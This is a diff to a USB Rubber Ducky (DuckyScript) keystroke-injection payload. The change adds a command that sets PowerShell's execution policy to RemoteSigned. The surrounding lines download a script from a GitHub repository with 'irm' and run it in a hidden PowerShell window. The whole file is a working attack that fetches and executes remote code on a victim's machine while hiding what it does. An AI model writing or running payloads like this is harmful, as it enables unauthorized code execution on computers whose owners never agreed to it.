@@ -8,9 +8,13 @@ ENTER
 
 DELAY 1000
 
+REM -- Change Exec Policy --
+STRING Set-ExecutionPolicy RemoteSigned -Scope Process
+ENTER
+
 REM -- Inject Script --
 STRING irm https://github.com/zznyjidi/force-you-to-play-osu/raw/refs/heads/main/run.ps1 -OutFile run.ps1
 ENTER
 DELAY 300
-STRING powershell -WindowStyle hidden run.ps1
+STRING powershell -WindowStyle hidden .\run.ps1
 ENTER
